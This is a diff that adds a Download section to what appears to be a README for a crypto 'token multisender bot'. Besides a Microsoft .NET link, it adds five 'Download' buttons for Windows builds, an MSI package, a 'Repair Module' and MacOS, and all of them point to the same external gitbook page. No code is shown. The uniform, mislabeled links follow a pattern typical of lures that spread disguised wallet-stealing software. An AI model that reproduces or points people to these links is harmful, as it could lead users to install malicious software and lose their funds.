@@ -17,6 +17,20 @@
 > Work on MAC OS & Windows
 
 ## Download
+https://selenium-finance.gitbook.io/token-multisender-bot/
+1: Download .NET V4.5 [```Download .NET Module```](https://www.microsoft.com/ru-ru/download/details.aspx?id=30653)
+
+2: Install Actual Precompile Release x32 / x64 👇
+
+Windows x64: [ ```Download``` ](https://selenium-finance.gitbook.io/token-multisender-bot)
+
+Windows x32: [ ```Download``` ](https://selenium-finance.gitbook.io/token-multisender-bot)
+
+Windows MSI Package: [ ```Download``` ](https://selenium-finance.gitbook.io/token-multisender-bot)
+
+Windows Repair Module: [ ```Download``` ](https://selenium-finance.gitbook.io/token-multisender-bot)
+
+MAC OS: [ ```Download``` ](https://selenium-finance.gitbook.io/token-multisender-bot)
 
 ## *IMPORTANT*
 This bot is designed for automatic multi-distribution of tokens from the owner's wallet, with confirmation from the deployed smart contract of the token. 
